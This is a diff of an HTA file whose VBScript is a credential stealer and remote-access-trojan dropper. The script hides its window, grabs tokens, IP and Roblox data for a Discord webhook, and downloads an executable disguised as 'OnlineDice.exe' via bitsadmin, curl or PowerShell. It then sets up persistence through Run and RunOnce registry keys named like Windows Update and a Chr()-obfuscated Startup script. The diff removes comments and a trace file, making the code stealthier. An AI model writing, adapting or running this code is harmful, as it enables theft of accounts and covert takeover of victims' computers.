@@ -1,11 +1,7 @@
-
 <html>
 <head>
-<!-- This site is hosted on Netlify. Anyone can build and deploy a site
-     like this one for free: https://netlify.new/?utm_campaign=ai-legible&utm_source=comment&utm_medium=referral&utm_id=cb2b3e1f-2451-4656-b47c-8aa7471a525a
-     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
 <meta name="hosting-provider" content="Netlify">
-<meta name="netlify-deploy" content="https://netlify.new/?utm_campaign=ai-legible&amp;utm_source=meta&amp;utm_medium=referral&amp;utm_id=cb2b3e1f-2451-4656-b47c-8aa7471a525a"><title>.</title>
+<title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
 window.resizeTo 0,0:window.moveTo -2000,-2000
@@ -15,15 +11,11 @@ Dim sh, fso, WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' CHANGE THIS TO YOUR WEBHOOK URL
+' Webhook URL
 WH = "https://discord.com/api/webhooks/1556860720715530360/NTFfdFr8FDom_3KRH9QPQ7OcRumPW7qsQ2x3d0T73SgJRNMQGnex1BoSAjXk1gArGGTG"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
-
-' TRACE
-Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
-Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
 
 Call GrabTokens
 Call IP
@@ -111,33 +103,26 @@ Sub GrabRoblox()
 End Sub
 
 Sub DropRAT()
-    ' CHANGE THIS TO YOUR RAT URL
     Dim dl : dl = "https://ia600108.us.archive.org/34/items/24242424_202607/OnlineDice.exe"
     Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\OnlineDice.exe"
     
-    ' DOWNLOAD USING BITSADMIN
     sh.Run "bitsadmin /transfer rdownload /download /priority high " & dl & " " & op, 0, True
     
-    ' IF BITS FAILS - USE CURL
     If Not fso.FileExists(op) Then
         sh.Run "cmd /c curl -L -o """ & op & """ """ & dl & """", 0, True
     End If
     
-    ' IF CURL FAILS - USE POWERSHELL
     If Not fso.FileExists(op) Then
         sh.Run "powershell -Command ""$url='" & dl & "'; $out='" & op & "'; (New-Object Net.WebClient).DownloadFile($url,$out)""", 0, True
     End If
     
     If fso.FileExists(op) Then
-        ' ADD TO STARTUP
         Dim startup
         startup = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\OnlineDice.exe"
         fso.CopyFile op, startup, True
         
-        ' REGISTRY PERSISTENCE
         sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OnlineDice", op, "REG_SZ"
         
-        ' RUN THE RAT
         sh.Run op, 0, False
     End If
 End Sub
@@ -146,13 +131,9 @@ Sub Persistence()
     Dim payload : payload = "mshta https://YOUR_NETLIFY_URL/system.hta"
     On Error Resume Next
     
-    ' 1) Registry Run (HKCU)
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
-    
-    ' 2) Registry RunOnce (HKCU)
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
     
-    ' 3) Startup folder VBS
     Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
     Dim sf : Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
